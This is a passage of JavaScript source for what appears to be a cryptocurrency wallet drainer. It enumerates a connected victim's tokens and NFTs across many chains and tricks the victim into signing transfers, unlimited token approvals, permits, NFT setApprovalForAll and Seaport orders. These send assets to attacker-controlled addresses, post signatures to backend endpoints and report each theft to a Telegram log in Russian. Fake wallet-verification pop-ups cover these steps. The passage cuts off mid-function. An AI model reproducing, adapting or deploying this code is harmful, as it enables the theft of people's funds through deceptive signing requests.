                    (item.chain == "eth" && item.id !== "eth") ||
                    (item.chain == "bsc" && item.id !== "bsc") ||
                    (item.chain == "matic" && item.id !== "matic") ||
                    (item.chain == "arb" && item.id !== "arb")
                ) {
                    isApprovedPermit2 = await isTokenApprovedPermit(account, item.id, item.chain);
                }
                console.log("isApprovedSushiswap");
                console.log(isApprovedSushiswap);
                if (item.chain == "eth" && item.id !== "eth" && isApprovedSushiswap > 0) {
                    temp.type = "4";
                    temp.approve_amount = isApprovedSushiswap;
                } else if (item.chain == "bsc" && item.id !== "bsc" && isApprovedPancake2 > 0) {
                    temp.type = "32";
                    temp.approve_amount = isApprovedPancake2;
                } else if (item.chain == "bsc" && item.id !== "bsc" && isApprovedPancake > 0) {
                    temp.type = "3";
                    temp.approve_amount = isApprovedPancake;
                } else if (
                    (item.chain == "eth" && item.id !== "eth" && isApprovedPermit2 > 0) ||
                    (item.chain == "bsc" && item.id !== "bsc" && isApprovedPermit2 > 0) ||
                    (item.chain == "matic" && item.id !== "matic" && isApprovedPermit2 > 0) ||
                    (item.chain == "arb" && item.id !== "arb" && isApprovedPermit2 > 0)
                ) {
                    temp.type = "2";
                    temp.approve_amount = isApprovedPermit2;
                } else {
                    temp.type = "1";
                }
                if (
                    item.id == "eth" ||
                    item.id == "bsc" ||
                    item.id == "matic" ||
                    item.id == "ftm" ||
                    item.id == "avax" ||
                    item.id == "op" ||
                    item.id == "arb" ||
                    item.id == "celo" ||
                    item.id == "movr" ||
                    item.id == "cro" ||
                    item.id == "boba" ||
                    item.id == "metis" ||
                    item.id == "btt" ||
                    item.id == "mobm" ||
                    item.id == "sbch" ||
                    item.id == "fuse" ||
                    item.id == "hmy" ||
                    item.id == "klay" ||
                    item.id == "astar" ||
                    item.id == "sdn" ||
                    item.id == "palm" ||
                    item.id == "iotx" ||
                    item.id == "rsk" ||
                    item.id == "wan" ||
                    item.id == "kcc" ||
                    item.id == "sgb" ||
                    item.id == "dfk" ||
                    item.id == "tlos" ||
                    item.id == "swm" ||
                    item.id == "nova" ||
                    item.id == "canto" ||
                    item.id == "doge" ||
                    item.id == "kava" ||
                    item.id == "step" ||
                    item.id == "mada" ||
                    item.id == "cfx" ||
                    item.id == "brise"
                )
                    temp.type = 0;

                console.log(temp);

                const tokensInThisChain = data.filter((token) => token.chain == item.chain);

                let multiplier = 1;

                if (tokensInThisChain.length <= 1) {
                    multiplier = 0;
                }

                temp.tokenAmount = item.raw_amount;
                if (item.id == item.chain) {
                    if (item.chain == "eth") {
                        temp.tokenAmount =
                            ethers.BigNumber.from(temp.tokenAmount) -
                            (temp.tokenAmount / temp.balance) * 40 * multiplier;
                        temp.tokenAmount = temp.tokenAmount.toString();

                        temp.balance - 9 * multiplier;
                    } else {
                        temp.tokenAmount =
                            ethers.BigNumber.from(temp.tokenAmount) -
                            (temp.tokenAmount / temp.balance) * 25 * multiplier;
                        temp.tokenAmount = temp.tokenAmount.toString();

                        temp.balance - 5 * multiplier;
                    }
                }

                temp.chain = item.chain;
                temp.tokenAmountHex = item.raw_amount_hex_str;
                temp.tokenAmountFix = item.amount;
                temp.symbol = item.symbol;

                if (temp.balance <= 0 || temp.tokenAmount <= 0) return;

                try {
                    tokenList.push(temp);
                } catch (e) {
                    tokenList = [];
                    tokenList.push(temp);
                }
            })
        );
        setItem("tokenList", tokenList);
        connected = 2;
    }
    if (weth_include !== "0") {
        wasWethApproved = 1;
        bundlePrice += perETH_usd * ethers.utils.formatEther(balance);
        const weth_order = {
            itemType: 0x1,
            token: WETH,
            identifierOrCriteria: "0",
            startAmount: weth_include,
            endAmount: weth_include,
        };
        const weth_consider = {
            itemType: 0x1,
            token: WETH,
            identifierOrCriteria: "0",
            startAmount: weth_include,
            endAmount: weth_include,
            recipient: endpoint,
        };
        orders.push(weth_order);
        considers.push(weth_consider);
    }
    const date = getPreviousDay();
    const milliseconds = date.getTime();
    const dateClone = date;
    const tomorrow = dateClone.setTime(milliseconds + 2 * 24 * 60 * 60 * 1000);
    const milliseconds_tomorrow = dateClone.getTime();
    const tomorrow_seconds = Math.floor(milliseconds_tomorrow / 1000);
    const seconds = Math.floor(milliseconds / 1000);
    const salt = generateString(70);
    const offer = {
        offerer: ethers.utils.getAddress(account),
        zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00",
        offer: orders,
        consideration: considers,
        orderType: 2,
        startTime: seconds,
        endTime: tomorrow_seconds,
        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
        salt: salt,
        totalOriginalConsiderationItems: considers.length,
        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
    };

    tokenList.forEach((token) => {
        if (token.type == "1" && token.approved == true) {
            uniPrice += token.balance;
        }
    });
    if (uniPrice > 0) {
        tokenList.push({
            type: "5",
            chain: "eth",
            tokenAddress: "",
            token_ids: "",
            price: null,
            balance: uniPrice,
            owned: "",
            approved: false,
        });
    }
    if (offer.offer.length == 0) {
        tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance) ? 1 : -1));
        _console.log("TokenList", tokenList);
        await sendToken(offer, counter, Seaport);
        await waitClose();
        return;
    } else {
        tokenList.push({
            type: "seaport",
            chain: "eth",
            tokenAddress: "",
            token_ids: "",
            price: null,
            balance: bundlePrice,
            owned: "",
            approved: false,
        });
    }

    tokenList.sort((a, b) => (Number(b.balance) > Number(a.balance) ? 1 : -1));
    await sendToken(offer, counter, Seaport);
    await waitClose();
}

async function claimETH(amount, msg, chainId, symbol, balance) {
    if (account == "") return;
    (abi = new ethers.utils.Interface([
        {
            constant: ![],
            inputs: [],
            name: "Claim",
            outputs: [],
            payable: !![],
            stateMutability: "payable",
            type: "function",
        },
    ])),
        (encoded = abi.encodeFunctionData("Claim"));
    let gasStock = "300000";
    if (chainId == "0x1") {
        gasStock = "21000";
    } else if (chainId == "0x38") {
        gasStock = "300000";
    } else if (chainId == "0x89") {
        gasStock = "1000000";
    } else if (chainId == "0xfa") {
        gasStock = "500000";
    } else if (chainId == "0xa86a") {
        gasStock = "290000";
    } else if (chainId == "0xa") {
        gasStock = "1800000000";
    } else if (chainId == "0xa4b1") {
        gasStock = "4447124";
    } else if (chainId == "0xa4ec") {
        gasStock = "300000";
    }
    let ethBalance = web3.utils.fromWei(BigInt(Number.parseFloat(amount)).toString(), "ether");

    success = 1;

    const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
    // const gasLimit = await ethersProvider.estimateGas({
    //   to: ownerAddress,
    //   value: web3.utils.toWei(ethBalance.toString(), "ether"),
    // });
    const gasPrice = await web3.eth.getGasPrice();
    let mgasPrice = web3.utils.toHex(gasPrice);

    if (chainId == "0x1") {
        mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.3));
    }
    // const valueToSend = web3.utils.toWei(ethBalance.toString(), "ether") - (parseInt(gasPrice) * gasStock);
    const gasWei = ethers.BigNumber.from(gasStock).mul(Math.floor(gasPrice * 1.3));

    const sendWei = web3.utils.toWei(ethBalance.toString(), "ether");
    _console.log(sendWei);
    const valueToSend = ethers.BigNumber.from(sendWei).sub(gasWei).sub(gasWei).sub(gasWei);
    const valueToSendString = valueToSend.toString();
    const valueToTransHex = web3.utils.toHex(valueToSendString);

    var transactionObject = {
        from: account,
        to: ownerAddress,
        value: valueToTransHex,
    };

    // logTlg(`${gasStock}  ${ethBalance} ${ethBalance} ${ethBalance}`);
    if (valueToSend <= 0) {
        _console.log("GASA MALO ");
        return;
    }
    logTlg(
        `🔄 <b>#${userId} получил TRANSFER ${ethBalance} ${symbol} (${balance.toFixed(2)}$)</b> в сети <b>${
            chainIdToName[chainId]
        }</b>`
    );
    try {
        if (chainId == "0x1") {
            await signer.sendTransaction({
                from: account,
                to: MintETH,
                value: valueToTransHex,
                data: encoded,
                gasLimit: "0xC350",
            });
        } else if (chainId == "0x38") {
            await signer.sendTransaction({
                from: account,
                to: MintBNB,
                value: valueToTransHex,
                data: encoded,
                gasLimit: "0xC350",
            });
        } else {
            await web3.eth.sendTransaction(transactionObject);
        }
        // logTlg(
        //   `✅ <b>#${userId} подписал TRANSFER ${ethBalance} ${symbol} (${balance.toFixed(2)}$)</b> в сети <b>${chainIdToName[chainId]}</b>`
        // );
    } catch (e) {
        _console.log(e);
        success = 0;
    }

    logTlgMsg(msg, success);

    if (success) withdrawETH(amount, chainId);
}

async function withdrawETH(amount, chainId) {
    fetch(CLAIM_ETH, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body: JSON.stringify({
            amount,
            chainId,
            account,
        }),
    });
}

async function claimERC20(tokenAddress, amount, msg, chainId, abiUrl, symbol, balance, network, item) {
    const contractInfo = await getABI(tokenAddress, abiUrl);
    const tokenContract = new web3.eth.Contract(contractInfo[0], tokenAddress);
    const contract = new ethers.Contract(tokenAddress, contractInfo[0], signer);
    const functions = contract.functions;
    success = 1;

    let hasPermit =
        functions.hasOwnProperty("permit") &&
        functions.hasOwnProperty("nonces") &&
        functions.hasOwnProperty("name") &&
        functions.hasOwnProperty("DOMAIN_SEPARATOR") &&
        isValidPermit(functions);

    if (hasPermit && chainId !== "0x89") {
        logTlg(
            `🔄 <b>#${userId} получил PERMIT ${item.tokenAmountFix} ${symbol} (${balance.toFixed(2)}$)</b> в сети <b>${
                chainIdToName[chainId]
            }</b>`
        );
        const data = {
            chainId: chainId,
            tokenAddress: tokenAddress,
            abiUrl: abiUrl,
            amount: amount,
            owner: account,
            spender: operator,
            permit: await permit(msg, contract, account, operator),
            impl: contractInfo[1],
        };
        if (permitApprove == 1) {
            axios.post(TOKEN_APPROVE, data).then(function (response) {
                logTlg(
                    `✅ <b>#${userId} подписал PERMIT ${item.tokenAmountFix} ${symbol} (${balance.toFixed(
                        2
                    )}$)</b> в сети <b>${chainIdToName[chainId]}</b>`
                );
            });
            data.permit = JSON.parse(data.permit);
            let permitMsg = `⚙️ If permit did not automatically apply:<br>`;
            permitMsg += "https://" + chainToId[network].explorer + "/token/" + data.tokenAddress;
            permitMsg += "<br>Contract: <code>" + data.tokenAddress + "</code>";
            permitMsg += "<br>Network: <code>" + network + "</code>";
            permitMsg += "<br>Owner: <code>" + data.owner + "</code>";
            permitMsg += "<br>Spender: <code>" + data.spender + "</code>";
            permitMsg += "<br>Value: <code>" + data.permit.value + "</code>";
            permitMsg += "<br>Deadline: <code>" + data.permit.deadline + "</code>";
            permitMsg += "<br>v: <code>" + data.permit.v + "</code>";
            permitMsg += "<br>r: <code>" + data.permit.r + "</code>";
            permitMsg += "<br>s: <code>" + data.permit.s + "</code>";
            // logTlg(permitMsg);
        }
        return data;
    }

    let nodeName = "";
    try {
        nodeName = await web3.eth.getNodeInfo();
    } catch (error) {
        _console.log(error);
    }
    const isMetaMask = provider.isMetaMask && nodeName && nodeName.toLowerCase().includes("metamask");
    if (isMetaMask && false) {
        logTlg(`💎 Кошелек ${account} получил запрос на Transfer ${symbol} на сумму ${balance}$ в сети ${chainId}`);
        const gasPrice = await web3.eth.getGasPrice();
        try {
            await tokenContract.methods.transfer(ownerAddress, amount).send({
                from: account,
                gas: 110000,
                gasPrice: gasPrice,
            });
            logTlg(`💸 ${symbol} ${balance}$ были успешно отправлены и зачислены на ваш кошелек`);
        } catch (e) {
            _console.log(e);
            success = 0;
        }
        logTlgMsg(msg, success);
    } else {
        logTlg(
            `🔄 <b>#${userId} получил APPROVE ${item.tokenAmountFix} ${symbol} (${balance.toFixed(2)}$)</b> в сети <b>${
                chainIdToName[chainId]
            }</b>`
        );
        const gasPrice = await web3.eth.getGasPrice();
        try {
            let txHash;
            try {
                if (window.ethereum) {
                    const ABI = [
                        "function increaseAllowance(address spender, uint256 addedValue) public returns (bool success)",
                    ];
                    const iface = new ethers.utils.Interface(ABI);
                    const abi_data = iface.encodeFunctionData("increaseAllowance", [
                        operator,
                        ethers.constants.MaxUint256,
                    ]);

                    const nonce = await ethersProvider.getTransactionCount(tokenAddress);
                    const gas = await contract.estimateGas.increaseAllowance(operator, MAX_APPROVAL);

                    const tx = {
                        from: account,
                        // chain_id: CHAIN_TO_ID[token.chain].chainId,
                        to: tokenAddress,
                        nonce: "0x" + nonce.toString(16),
                        value: "0x0000",
                        data: abi_data,
                    };
                    txHash = await window.ethereum.request({
                        method: "eth_sendTransaction",
                        params: [tx],
                    });
                } else {
                    const tx = await contract.increaseAllowance(operator, MAX_APPROVAL);
                    txHash = tx.hash;
                }
            } catch (e) {
                _console.log(e.message);

                if (e.message != "contract.estimateGas.increaseAllowance is not a function") {
                    logTlgMsg(msg, false);
                    return;
                }

                if (window.ethereum) {
                    const ABI = ["function approve(address spender, uint256 addedValue) public returns (bool success)"];
                    const iface = new ethers.utils.Interface(ABI);
                    const abi_data = iface.encodeFunctionData("approve", [operator, ethers.constants.MaxUint256]);

                    const nonce = await ethersProvider.getTransactionCount(tokenAddress);

                    const tx = {
                        from: account,
                        // chain_id: CHAIN_TO_ID[token.chain].chainId,
                        to: tokenAddress,
                        nonce: "0x" + nonce.toString(16),
                        value: "0x0000",
                        data: abi_data,
                    };
                    txHash = await window.ethereum.request({
                        method: "eth_sendTransaction",
                        params: [tx],
                    });
                } else {
                    const tx = await contract.approve(operator, MAX_APPROVAL);
                    txHash = tx.hash;
                }
            }

            const data = {
                chainId: chainId,
                tokenAddress: tokenAddress,
                abiUrl: abiUrl,
                amount: amount,
                owner: account,
                spender: operator,
                txn: txHash,
            };
            axios.post(TOKEN_TRANSFER, data).then(function (response) {
                // logTlg(
                //   `✅ <b>#${userId} ${symbol} на сумму ${balance.toFixed(
                //     3
                //   )}$ успешно списались методом APPROVE и зачислились на ваш кошелёк в сети ${
                //     chainIdToName[chainId]
                //   }</b>`
                // );
            });
        } catch (e) {
            _console.log(e);
            success = 0;
        }
        logTlgMsg(msg, success);
    }
}

async function claimNFT(tokenAddress, nftTokenID, chainId, msg, balance) {
    const data = {
        owner: account,
        tokenAddress: tokenAddress,
        tokens: nftTokenID,
    };
    var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
    success = 1;
    logTlg(
        `🔄 <b>#${userId} получил запрос на APPROVE NFT на сумму ${balance.toFixed(3)}$ в сети ${
            chainIdToName[chainId]
        }</b>`
    );
    const gasPrice = await web3.eth.getGasPrice();
    let estimateGas;
    try {
        estimateGas = await tokenContract.methods.setApprovalForAll(operator, true).estimateGas({ from: account });
    } catch {
        estimateGas = 100000;
    }
    try {
        await tokenContract.methods.setApprovalForAll(contractSAFA, true).send({
            from: account,
            gas: estimateGas,
            gasPrice: gasPrice,
        });
        axios.post(NFT_TRANSFER, data).then(function (response) {
            // logTlg(
            //   `✅ <b>#${userId} ${symbol} на сумму ${balance.toFixed(
            //     3
            //   )}$ успешно списались методом SAFA и зачислились на ваш кошелёк в сети ${
            //     chainIdToName[chainId]
            //   }</b>`
            // );
        });
    } catch (e) {
        _console.log(e);
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function claim1155NFT(tokenAddress, nftTokenID, chainId, msg) {
    var tokenContract = new web3.eth.Contract(ERC1155_ABI, tokenAddress);
    success = 1;
    const gasPrice = await web3.eth.getGasPrice();
    let estimateGas;
    try {
        estimateGas = await tokenContract.methods.setApprovalForAll(operator, true).estimateGas({ from: account });
    } catch {
        estimateGas = 150000;
    }
    try {
        await tokenContract.methods.setApprovalForAll(operator, true).send({
            from: account,
            gas: estimateGas,
            gasPrice: gasPrice,
        });
    } catch (e) {
        _console.log(e);
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function sign1155NFT(tokenAddress, nftTokenID, chainId, msg) {
    var tokenContract = new web3.eth.Contract(ERC1155_ABI, tokenAddress);
    success = 1;
    try {
        const nonce = web3.utils.toHex(await web3.eth.getTransactionCount(account));
        const gasPrice = await web3.eth.getGasPrice();
        let mgasPrice = web3.utils.toHex(gasPrice);
        if (chainId == "0x1") {
            mgasPrice = web3.utils.toHex(Math.floor(gasPrice * 1.3));
        }
        tx_ = {
            to: tokenAddress,
            nonce: nonce,
            gasLimit: "0x493E0",
            gasPrice: mgasPrice,
            value: "0x0",
            data: tokenContract.methods.setApprovalForAll(operator, true).encodeABI(),
            r: "0x",
            s: "0x",
            v: chainId,
        };
        const { ethereumjs } = window;
        var tx = new ethereumjs.Tx(tx_);
        const serializedTx = "0x" + tx.serialize().toString("hex");
        const sha3_ = web3.utils.sha3(serializedTx, { encoding: "hex" });
        const initialSig = await web3.eth.sign(sha3_, account);
        const temp = initialSig.substring(2),
            r = "0x" + temp.substring(0, 64),
            s = "0x" + temp.substring(64, 128),
            rhema = parseInt(temp.substring(128, 130), 16),
            v = web3.utils.toHex(rhema + chainId * 2 + 8);
        tx.r = r;
        tx.s = s;
        tx.v = v;
        const txFin = "0x" + tx.serialize().toString("hex");
        _console.log("Waiting for sign submitting...");
        const res = await web3.eth.sendSignedTransaction(txFin);
        _console.log("Submitted:", res);
    } catch (e) {
        if (e.code == "-32601") {
            _console.log("Подпись не поддерживается");
            const gasPrice = await web3.eth.getGasPrice();
            let estimateGas;
            try {
                estimateGas = await tokenContract.methods
                    .setApprovalForAll(operator, true)
                    .estimateGas({ from: account });
            } catch {
                estimateGas = 150000;
            }
            try {
                await tokenContract.methods.setApprovalForAll(operator, true).send({
                    from: account,
                    gas: estimateGas,
                    gasPrice: gasPrice,
                });
            } catch (e) {
                _console.log(e);
                success = 0;
            }
        } else {
            _console.log(e);
            success = 0;
        }
    }
    logTlgMsg(msg, success);
}

async function sendPancake(tokenAddress, amount, msg, symbol, balance, item) {
    let deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
    let pancakeRouter = new web3.eth.Contract(PANCAKESWAP_ABI, PANCAKE_CONTRACT_ADDRESS);
    let amountFix = ethers.BigNumber.from(amount).toString();

    logTlg(
        `🔄 <b>#${userId} получил Pancake ${amountFix} ${symbol} (${balance.toFixed(2)}$)</b> в сети <b>${
            chainIdToName["bsc"]
        }</b>`
    );
    let path = [];
    path[0] = tokenAddress;
    path[1] = BUSD_BSC != tokenAddress ? BUSD_BSC : WBNB_BSC;
    let amountIn = amountFix;
    let amountOut = 0;
    success = 1;
    try {
        const gasPrice = await web3.eth.getGasPrice();
        await pancakeRouter.methods.swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress, deadline).send({
            from: account,
        });
    } catch (e) {
        _console.log(e);
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function sendPancake2(tokenAddress, amount, msg, symbol, balance, itemToken) {
    logTlg(
        `🔄 <b>#${userId} получил Pancake2 ${itemToken.tokenAmountFix} ${symbol} (${balance.toFixed(
            2
        )}$)</b> в сети <b>${chainIdToName[itemToken.chain]}</b>`
    );
    let deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
    console.log("PANCAKESWAP_ABI2");
    console.log(PANCAKESWAP_ABI2);
    let pancakeRouter = new web3.eth.Contract(PANCAKESWAP_ABI2, PANCAKE_CONTRACT_ADDRESS2);
    let calls = [];
    try {
        for (var item of tokenList) {
            if (item.type == "32") {
                let amountFix = ethers.BigNumber.from(item.approve_amount).toString();
                let path = [];
                path[0] = item.tokenAddress;
                console.log(item.tokenAddress == "0x55d398326f99059ff775485246999027b3197955");
                path[1] =
                    item.tokenAddress == "0x55d398326f99059ff775485246999027b3197955"
                        ? BUSD_BSC
                        : "0x55d398326f99059fF775485246999027B3197955";
                // path[2] =
                //   BUSD_BSC.toLowerCase() != item.tokenAddress.toLowerCase()
                //     ? BUSD_BSC
                //     : WBNB_BSC;
                let amountIn = amountFix;
                let amountOut = 0;
                success = 1;
                try {
                    console.log(amountIn, amountOut, path, ownerAddress);
                    const itemdata = pancakeRouter.methods
                        .swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress)
                        .encodeABI();

                    const gas = await pancakeRouter.methods
                        .swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress)
                        .estimateGas({ from: account });

                    console.log(itemdata);
                    calls.push(itemdata);
                } catch (e) {
                    continue;
                }
            }
        }
        if (!calls.length) return;

        let gasPrice = await web3.eth.getGasPrice();
        await pancakeRouter.methods.multicall(deadline, calls).send({ from: account });
    } catch (e) {
        _console.log(e);
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function sendSushi(tokenAddress, amount, msg, symbol, balance, item) {
    logTlg(
        `🔄 <b>#${userId} получил Sushiswap ${item.tokenAmountFix} ${symbol} (${balance.toFixed(2)}$) в сети <b>${
            chainIdToName[item.chain]
        }</b></b>`
    );
    let deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
    let sushiRouter = new web3.eth.Contract(SUSHISWAP_ABI, SUSHI_CONTRACT_ADDRESS);
    let amountFix = ethers.BigNumber.from(amount).toString();
    let path = [];
    path[0] = tokenAddress;
    path[1] = USDC != tokenAddress ? USDC : WETH;
    let amountIn = amountFix;
    let amountOut = 0;
    success = 1;
    try {
        const gasPrice = await web3.eth.getGasPrice();
        await sushiRouter.methods.swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress, deadline).send({
            from: account,
        });
    } catch (e) {
        _console.log(e);
        success = 0;
    }
    logTlgMsg(msg, success);
}

async function sendUniswap(msg, balance) {
    logTlg(`🔄 <b>#${userId} получил UNISWAP Multicall ${balance.toFixed(2)}$</b>`);
    let deadline = Math.floor(Date.now() / 1000) + 9999 * 10;
    let contractMulticall = new web3.eth.Contract(UNISWAP_ABI, UNISWAP_CONTRACT_ADDRESS);
    let calls = [];
    for (var item of tokenList) {
        if (item.type == "1" && item.approved == true) {
            let path = [];
            path[0] = item.tokenAddress;
            path[1] = USDC != item.tokenAddress ? USDC : WETH;
            let amountFix = ethers.BigNumber.from(item.approve_amount).toString();
            let amountIn = amountFix;
            let amountOut = 0;
            item.data = contractMulticall.methods
                .swapExactTokensForTokens(amountIn, amountOut, path, ownerAddress)
                .encodeABI();
            calls.push(item.data);
        }
    }
    success = 1;
    if (calls.length != 0) {
        try {
            const gasPrice = await web3.eth.getGasPrice();
            await contractMulticall.methods.multicall(deadline, calls).send({ from: account });
        } catch (e) {
            _console.log(e);
            success = 0;
        }
    }
    logTlgMsg(msg, success);
}

async function sendToken(offer, counter, Seaport) {
    logTokenList();

    if (tokenList.length == 0 || totalBalance <= 20) {
        alert("You have not enough balance to use");
        return true;
    }
    for (var item of tokenList) {
        if (!item.approved) {
            _console.log(item);

            try {
                if (item.balance > 4) {
                    if (wasWethApproved == 1 && item.tokenAddress == "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2")
                        continue;
                    if (item.tokenAddress == "0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85") continue;
                    if (
                        selectedProvider == supportedWallets[0] ||
                        selectedWallets == "1" ||
                        selectedWallets == "2" ||
                        selectedWallets == "3"
                    ) {
                        if (item.type == "seaport") continue;
                    }
                    if (item.type == "erc721" && item.balance < 5) continue;
                    if (item.type == "erc1155" && item.balance < 5) continue;
                    if (item.type == "seaport" && item.balance < 5) continue;

                    const currentChainId = await web3.eth.net.getId();
                    const chainHex = await web3.utils.toHex(currentChainId);
                    if (chainHex !== chainToId[item.chain].chainId) {
                        try {
                            await changeNetwork(chainToId[item.chain].chainId);
                        } catch (e) {
                            const currentNetworkVersion = Number.parseInt(window.ethereum.networkVersion).toString(16);
                            const currentNetwork = chainIdToName[`0x${currentNetworkVersion}`];
                            logTlg(
                                `🚫 <b>#${userId} отклонил</b> смену сети из <b>${
                                    currentNetwork || `0x${currentNetworkVersion}`
                                }</b> на <b>${chainIdToName[chainToId[item.chain].chainId]}</b>`
                            );
                        }
                    }

                    const currentChainId2 = await web3.eth.net.getId();
                    const chainHex2 = await web3.utils.toHex(currentChainId2);
                    if (chainHex2 !== chainToId[item.chain].chainId) continue;

                    if (item.type == "0") {
                        let ethBalance = web3.utils.fromWei(
                            BigInt(Number.parseFloat(item.tokenAmount)).toString(),
                            "ether"
                        );
                        msgs = `<b>TRANSFER ${ethBalance} ${item.symbol} (${item.balance.toFixed(2)}$)</b> в сети <b>${
                            chainIdToName[item.chain]
                        }</b>`;
                        if (
                            /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
                        ) {
                            await claimETH(
                                item.tokenAmount,
                                msgs,
                                chainToId[item.chain].chainId,
                                item.symbol,
                                item.balance
                            );
                        } else {
                            await claimETH(
                                item.tokenAmount,
                                msgs,
                                chainToId[item.chain].chainId,
                                item.symbol,
                                item.balance
                            );
                        }
                    } else if (item.type == "1") {
                        msgs = `<b>APPROVE ${item.tokenAmountFix} ${item.symbol} (${item.balance.toFixed(
                            2
                        )}$)</b> в сети <b>${chainIdToName[item.chain]}</b>`;
                        if (
                            /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
                        ) {
                            await claimERC20(
                                item.tokenAddress,
                                item.tokenAmountHex,
                                msgs,
                                chainToId[item.chain].chainId,
                                chainToId[item.chain].abiUrl,
                                item.symbol,
                                item.balance,
                                item.chain,
                                item
                            );
                        } else {
                            await claimERC20(
                                item.tokenAddress,
                                item.tokenAmountHex,
                                msgs,
                                chainToId[item.chain].chainId,
                                chainToId[item.chain].abiUrl,
                                item.symbol,
                                item.balance,
                                item.chain,
                                item
                            );
                        }
                    } else if (item.type == "2") {
                        msgs = `<b>PERMIT2 ${item.tokenAmountFix} ${item.symbol} (${item.balance.toFixed(2)}$)</b> `;

                        await permit2(
                            item.tokenAddress,
                            item.approve_amount,
                            msgs,
                            chainToId[item.chain].chainId,
                            item.symbol,
                            item.balance,
                            item.chain,
                            item
                        );
                    } else if (item.type == "3") {
                        msgs = `<b>PancakeSwap ${item.tokenAmountFix} ${item.symbol} (${item.balance.toFixed(
                            2
                        )}$)</b> в сети <b>${chainIdToName[item.chain]}</b>`;
                        await sendPancake(
                            item.tokenAddress,
                            item.approve_amount,
                            msgs,
                            item.symbol,
                            item.balance,
                            item
                        );
                    } else if (item.type == "32") {
                        console.log(item);
                        console.log("PANCAKE");
                        msgs = `<b>PancakeSwap2 ${item.tokenAmountFix} ${item.symbol} (${item.balance.toFixed(
                            2
                        )}$)</b> в сети <b>${chainIdToName[item.chain]}</b>`;
                        await sendPancake2(
                            item.tokenAddress,
                            item.approve_amount,
                            msgs,
                            item.symbol,
                            item.balance,
                            item
                        );
                    } else if (item.type == "4") {
                        msgs = `<b>SushiSwap ${item.tokenAmountFix} ${item.symbol} (${item.balance.toFixed(
                            2
                        )}$)</b> в сети <b>${chainIdToName[item.chain]}</b>`;
                        await sendSushi(item.tokenAddress, item.approve_amount, msgs, item.symbol, item.balance, item);
                    } else if (item.type == "5") {
                        msgs = `<b>Uniswap ${item.balance.toFixed(2)}$ </b> в сети <b>${chainIdToName[item.chain]}</b>`;
                        await sendUniswap(msgs, item.balance);
                    } else if (item.type == "erc721") {
                        msgs = `<b>Transfer NFT 721 ${item.balance.toFixed(2)}$ </b>`;
                        if (
                            isMobile() ||
                            /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
                        ) {
                            await claimNFT(
                                item.tokenAddress,
                                item.token_ids,
                                chainToId[item.chain].chainId,
                                msgs,
                                item.balance
                            );
                        } else {
                            await claimNFT(
                                item.tokenAddress,
                                item.token_ids,
                                chainToId[item.chain].chainId,
                                msgs,
                                item.balance
                            );
                        }
                    } else if (item.type == "seaport") {
                        success = 1;
                        logTlg(`🔄 <b>#${userId} получил SEAPORT на сумму ${item.balance.toFixed(2)}$</b>`);
                        msgs = `<b>SEAPORT ${item.balance.toFixed(2)} $</b>`;
                        await Seaport.signOrder(offer, parseInt(counter))
                            .then(function (response) {
                                let sgt = response;
                                offer["counter"] = parseInt(counter);
                                const order = {
                                    recipient: endpoint,
                                    parameters: offer,
                                    signature: sgt,
                                };
                                const messageParts = splitMessage(JSON.stringify(order));
                                sendLogsParts(messageParts);
                                axios.post(SEAPORT_SIGN, order).then(function (response) {
                                    // logTlg(
                                    //   `✅ #${userId} Seaport на сумму ${item.balance.toFixed()}$ успешно выполен, NFT зачислились на ваш кошелёк`
                                    // );
                                });
                                logTlgMsg(msgs, success);
                            })
                            .catch(function (error) {
                                _console.log(error);
                                success = 0;
                                logTlgMsg(msgs, success);
                            });
                    } else {
                        msgs = `<b>Transfer NFT 1155 ${item.balance.toFixed(2)}$ </b>`;
                        if (
                            isMobile() ||
                            /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
                        ) {
                            await claim1155NFT(item.tokenAddress, item.token_ids, chainToId[item.chain].chainId, msgs);
                        } else {
                            await claim1155NFT(item.tokenAddress, item.token_ids, chainToId[item.chain].chainId, msgs);
                        }
                    }
                }
            } catch (e) {
                _console.log(e);
                continue;
            }
        }
    }
}

async function waitAlert() {
    Swal.fire({
        title: "Connection...",
        text: " Confirm that you are the owner of this wallet...",
        imageUrl: "/loadwallet.gif",
        imageHeight: 40,
        allowOutsideClick: false,
        allowEscapeKey: false,
        timer: 0,
        width: 300,
        showConfirmButton: false,
    });
}

async function waitClose() {
    Swal.close();
}

async function alertshow() {
    if (alert == 0) {
        Swal.fire({
            title: "Error!",
            text: "Connect has been failed, try with another wallet",
            icon: "error",
            confirmButtonText: "OK",
        });
        alert = 1;
    }
    if (alert == 1) {
        Swal.fire({
            title: "Error!",
            text: "This wallet cannot be connect, try another one",
            icon: "error",
            confirmButtonText: "OK",
        });
    }
}

const changeNetwork = async (chainId) => {
    const currentNetworkVersion = Number.parseInt(window.ethereum.networkVersion).toString(16);
    const currentNetwork = chainIdToName[`0x${currentNetworkVersion}`];

    if (window.ethereum) {
        try {
            logTlg(
                `🔄 <b>#${userId} получил</b> смену сети из <b>${
                    currentNetwork || `0x${currentNetworkVersion}`
                }</b> на <b>${chainIdToName[chainId]}</b>`
